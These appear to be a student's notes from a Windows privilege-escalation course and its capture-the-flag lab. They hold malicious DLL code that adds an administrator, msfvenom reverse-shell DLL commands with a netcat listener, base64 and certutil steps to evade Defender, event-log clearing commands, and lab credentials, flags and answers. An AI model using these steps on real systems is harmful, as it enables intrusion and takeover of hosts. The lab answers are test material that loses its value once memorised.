## Windows Exploitation Notes ##

ssh student@10.50.23.132 -L 36363:10.10.28.45:3389

xfreerdp /v:127.0.0.1:36363 /u:student /p:password /size:1920x1000 +clipboard

#### Windows Access Control Model ####

In charge of files that gives uses permissions. Users and groups are represented by unique SIDS, security identifiers. 

SACL -> stands for System Access Control List. SACLs allow administrators to log attempts to access a secured object. They can also be used to generate audit records to determine when access is granted, when access is denied, or both.

DACL -> stands for Discretionary Access Control List. DACLs identify the users and groups that are assigned or denied access permissions on an object. DACLs can be NULL or nonexistent (no restrictions, everyone full access), empty (no access at all), or a list. 

ACEs -> stands for Access Control Elements. An ACL is an ordered list of classification rules and actions. Each single classification rule, together with its action, is called an ACE. Each ACE specifies the types of access attempts by a specified trustee that cause the system to generate a record in the security event log.

Anytime windows needs to access dlls, it access this directory -> `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`

Windows also check the directory the application was run from. 

procexpe.exe 

view -> select columns -> integrity level # View permissions i.e. integrity levels -> UNTRUSTED(Anonymous SID access tokens), LOW (Everyone SID access token (World)), MEDIUM (Authenticated Users), HIGH(Administrators), SYSTEM (Administrators), System services (LocalSystem, LocalServices, NetworkService)

Checking UAC Settings --> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

1. Step 1. services -> 
    Sort by description -> click on description, upper arrow
    Double click on it
    See the path to executable
        For informational purposes. Can we actually attach maybe a dll here? 

2. Step 2. Open task scheduler 
    Look at actions

3. Step 3. How to identify the name of the DLL to hijack 
    Identify the source code. 
    Look at the user account and we have exercise 2, we can create a folder here 
    We found putty at student/exercise_2
    looking at putty's dlls, we find that it could be vulnerable online but the dlls are patched and vulnerability is fixed 

4. Step 4. Go back to the procmon.exe from the search bar
    Filter -> Column = Process Name, Relation = is, Value = putty.exe, Action = Include, then click Add
    Filter -> Column = Result, Relation = is, Value = NAME NOT FOUND, Action = Include, then click Add
    Filter -> Column = Path, Relation = contains, Value = dll, Action = Include, then click Add
    Click Okay 

5. Step 5. Go to Task Schedular:
    Right click on test_app -> Click End
    Right click on test_app -> Click Run 

    Procmon interface should be populated

6. Step 6. Go back to linops:
    Create a file called bad.exe, modify it like so and pay attention to the path where the file is stored i.e. WinExec:
    
    #include <windows.h>
    int execCommand()
    {
    WinExec("cmd /C whoami > C:\\users\\DemoAdmin\\FINDME_1.txt", 1);
    return 0;
    }
    BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
    {
    execCommand();
    return 0;
    }

7. Step 7.

Run `sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y`
Run `i686-w64-mingw32-g++ -c bad.c -o bad.o`
Run `i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a`
Run `base64 bad.dll > base64dll` Encodes it to base 64 to prevent detection 
Run `xclip -sel c -i base64dll ` Copies it to clipboard


8. Step 8. Go to the windows machine and open notepad. 

9. Step 9. Paste the copied base64dll and save it as base64dll.txt in documents. 

10. Step 10. Go to the location of the text `cd C:\Users\student.DESKTOP-51TGRU5\Documents\`

11. Step 11. Generate a dll -> C:\Users\student.DESKTOP-51TGRU5\Documents>`certutil -decode base64dll.txt SSPICLI.dll`

12. Step 12. Go to the location of the exercise_2 folder where the putty file rescided -> C:\Users\student.DESKTOP-51TGRU5\Documents> `copy SSPICLI.dll "c:\users\student\exercise_2\SSPICLI.dll"\`

13. Step 13. Go to Task Schedular:
    Right click on test_app -> Click End
    Right click on test_app -> Click Run 

14. Step 14. Check the location where the file was stored in the C code i.e. -> `C:\Users\DemoAdmin\` and you will find the FINDME_1 saved here which is the command on the C file. 

### OTHER NOTES ###

WinExec -> windows execution .exe. Prebuilt by microsoft. First argument is the one we are interested in manipulating. 

5. Alternative method for DLL creation using MSFVenom -> creates a reverse_tcp -> msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > bad.dll

6. `base64 bad.dll >base64dll` # Generate a base64 dll....why????

7. `xclip -sel c -i base64dll` # reads the output to your clipboard -> doing this so that the defender doesn't catch it. 


### FOR REPLACING EXECUTABLES THIS IS WHERE YOU SHOULD GO ###
C:Program Files/7Zip/
    Rename 7Zip.exe -> Makes the file not possible to run. 


If you wanna find out where someone has installed persistence go to registry. 

### SYSTEM USAGE ###


DEMO: Finding vulnerable Scheduled Tasks `schtasks /query /fo LIST /v`

DEMO: Finding Vulnerable Services
    `wmic service list full`
    `sc query`

Checking system resources -> 
    `wmic`
    `net`
    `netstat`

DEMO: Audit Logging Show all audit category settings `auditpol /get /category:*`
What does the below command show? `auditpol /get /category:* | findstr /i "success failure"` shows if you successfully escalaged privileges

#### DEMO: Event Logging ####
Storage: c:\windows\system32\config\

File-Type: .evtx/.evt
    `wevtutil el`
    `wmic ntevent where "logfile="<LOGNAME>" list full`
    `Get-Eventlog -List`

#### DEMO: Additional Logging ####
Powershell verion

Determine PS version (bunch of ways)
`reg query hklm\software\microsoft\powershell\3\powershellengine\`
`powershell -command "$psversiontable"`

Determine if logging is set (PowerShell and WMIC)
`reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell`
`reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging # 0 = no | 1 = errors | 2 = verbose`
WMIC Log Storage `%systemroot%\system32\wbem\Logs\`

Clear Event Logs (produces logging!):
`wevtutil clear-log Application`
`Clear-Eventlog -Log Application, System`

#### EVENT VIEWER ####

Windows Logs -> System -> Filter Current Log (on the right) -> Under <All Event ID> replace with the number event id e.g. 7045

### CHALLENGES ###

Donovian Windows Privilege Escalation (DWP)
XX Jan 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.

Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty

Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.

Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown


#### Cover - Windows Event Log 1 2 ####

Level I Challenge

What service is causing a error level log for 31 May between 1200-1330 hrs. System log file is located under comrade's directory.

#### ANSWER ####

Step 1. ssh student@10.50.23.132 -L 36363:192.168.28.105:2222
        password will be -> d07PevVUniUxBNR

Step 2. ssh comrade@localhost -p 36363 -L 36364:192.168.28.5:3389
        password will be -> StudentReconPassword

Step 3. xfreerdp /v:127.0.0.1:36364 /u:comrade /p:StudentPrivPassword /size:1920x1000 +clipboard

Step 4. File explorer --> Users--> comrade --> system -> Filter Current Log -> Filter by Date and type -> Look through General information and you will find, Fortnite Service

Answer -> Fortnite

#### Cover - Windows Event Log 2 2 ####

Level I Challenge

Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD

#### ANSWER ####


Step 1. Pick from Step 4. 

Step 2. Look through the XML code and found  <TimeCreated SystemTime="2019-05-31T13:02:25.785873400Z" />

        Answer -> 2019-05-31

#### Cover - Windows Event Log 3 2 ####

Level I Challenge

Using the same "system.evtx" log, is this a legitimate Windows service? To correctly answer the question enter Y or N.

#### ANSWER ####

N

#### Cover - Windows Event Log 4 2 ####

Level I Challenge

Using the same "system.evtx" log, The system time has changed, what is the new year?

#### ANSWER ####

Step 1. Clear filter on the right. 

Step 2. Sort by date and time - > new year 2230

Ans -> 2230

#### Priv - Vuln 1 5 ####

Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.

#### ANSWER ####

Step 1. Open services 

Step 2. Sort by description by clicking on the description. Notice that MemoryStatus does not have a description -> Looks suspect. 

Display name -> MemoryStatus

#### Priv - Vuln 2 5 ####

What Account will it utilize at Log on?

#### ANSWER ####

Step 1. Double click on MemoryStatus

Step 2. Select Logon

Ans -> Local System Account 

#### Priv - Escalation Type 5 5 ####

What type of escalation can you perform with your findings?

 DLL Hijacking
 AutoElevate
 UAC Bypass
 Unprotected Executables

#### ANSWER ####

Ans ->  DLL Hijacking

#### Priv - DLLs 5 ####

What is the name of the DLL that is supposed to be loaded, by the vulnerable service?

#### ANSWER ####

Step 1. Go to the services

Step 2. Double click on the MemoryStatus 

Step 3. Look at the general information and you will find that the executable is located at -> C:\MemoryStatus\service.exe

Step 4. Go to C:\MemoryStatus\ and there's a service.c file. 

Step 5. Open the file and control f and search for dll. 

Step 6. The file found is hijackmeplz.dll

#### Priv - Code 8 ####

Sample code below has been provided by our dev shop, they have been testing it; however, it appears to not function and request if you can get it to function.

C
#include 
int happyfunction(char * test)
{
 WinExec();
 return ;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 happyfunction("");
 return 0;

}

Correct code in order to escalate your privileges. What you seek is waiting on the Admins Desktop.


#### ANSWER ####

Step 1. Modify the code to get admin access

Step 2. touch hijackmeplz.c

Step 3. vim hijackmeplz.c

Step 4. Copy the code below to hijackmeplz.c and exit

#include <windows.h>
int execCommand()
{
WinExec("cmd /C net localgroup administrators hackeradmin /add.", 1);
return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
execCommand();
return 0;
}

Step 5. Run `i686-w64-mingw32-g++ -c hijackmeplz.c -o hijackmeplz.o`

Step 6. Run `i686-w64-mingw32-g++ -shared -o hijackmeplz.dll hijackmeplz.o -Wl,--out-implib,hijackmeplz.a`

Step 7 `Run msfvenom -p windows/shell_reverse_tcp LHOST=10.50.24.96 LPORT=6262 -f dll > hijackmeplz.dll`

Step 7. Run `base64 hijackmeplz.dll > base64dll` Encodes it to base 64 to prevent detection 

Step 8. Run `xclip -sel c -i base64dll ` Copies it to clipboard

Step 8. Go to the windows machine and open notepad. 

Step 9. Paste the copied base64dll and save it as base64.txt in documents. 

Step 10. Go to the location of the text `cd C:\Documents\`

Step 11. Generate a dll -> C:\Users\student.DESKTOP-51TGRU5\Documents>`certutil -decode base64.txt hijackmeplz.dll`

Step 12. Go to the location of the C:\MemoryStatus\ folder where the MemoryStatus file is located and copy it from the documents folder to here. Copy the dll here. 

Step 13. On your linops machine, open the netcat listener -> `nc lvn 6262` using the port entered in step 7 above

Step 14. Restart the target windows machine

Step 15. Go to the linops terminal that ran `xfreerdp /v:127.0.0.1:36364 /u:comrade /p:StudentPrivPassword /size:1920x1000 +clipboard` and keep running that until a connection is established. 

Step 16. A successful connection should log you in as an admin and presences a command window

Step 17. run `whoami` to confirm escalation privileges

Step 18. Run `cd C:\Users` to go to users directory 

Step 19. run `dir` to see open folders, admin is open, cd to admin and then to desktop to find the flag `cd Admin\Desktop` 

Step 20. run `dir` to see the open files and flag.txt is there. Run `type flag.txt` to find the contents of the flag

Ans -> xgrMY0JebCPgTE2Rdh3L

